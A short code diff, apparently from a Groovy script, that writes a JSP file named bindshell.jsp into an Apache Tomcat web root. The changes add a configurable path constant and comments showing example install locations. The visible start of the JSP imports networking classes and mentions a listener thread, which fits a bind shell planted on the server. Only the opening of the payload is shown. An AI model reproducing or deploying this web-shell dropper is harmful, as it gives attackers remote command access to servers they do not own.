@@ -1,4 +1,9 @@
-new File("C:/<tomcatroot>/ROOT/threaded.jsp").text ='''<%@ page import="java.io.*" %>
+// SET PATH TO APACHE TOMCAT WEB ROOT or WEB ROOT\APP
+//EXAMPLE:  C:\Program Files\Apache Software Foundation\Tomcat 9.0\ROOT\bindshell.jsp
+// //EXAMPLE:  C:\Program Files\Apache Software Foundation\Tomcat 9.0\ROOT\myapp\bindshell.jsp
+final BINDSHELL_PATH="C:\Program Files\Apache Software Foundation\Tomcat 9.0\ROOT\bindshell.jsp" 
+
+new File(BINDSHELL_PATH).text ='''<%@ page import="java.io.*" %>
 <%@ page import="java.net.*" %>
 <%!
     // Static block to ensure the listener thread is only started once.
